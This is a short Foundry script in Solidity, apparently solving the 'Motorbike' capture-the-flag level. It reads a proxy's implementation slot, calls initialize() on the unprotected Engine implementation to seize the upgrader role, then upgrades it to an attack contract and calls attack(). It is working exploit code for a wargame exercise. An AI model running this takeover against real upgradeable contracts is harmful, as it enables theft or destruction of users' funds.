// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "forge-std/Script.sol";
import {Motorbike, Engine} from "../src/Motorbike.sol";

contract DeployMotorbikeAttack is Script {
    Motorbike motorbike = Motorbike(0x2976993111c3668C01b4b29f6ACD4dFa32288D70); // Proxy contract instance

    // vm.load(contract_address, slot_no) will return a bytes32 value and the address is 20 bytes
    // address(uint160(uint256())) is used to convert bytes32 to address
    Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

    function run() external{
        vm.startBroadcast();

        engineAddress.initialize();
        console.log("Attacker upgrader is:", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("attack()");
        engineAddress.upgradeToAndCall(0x2CfeB660f987426C38DFEFF0FED5f77F20b277D1, encodedData); // attack contract address, encoded data

        vm.stopBroadcast();
    }
}
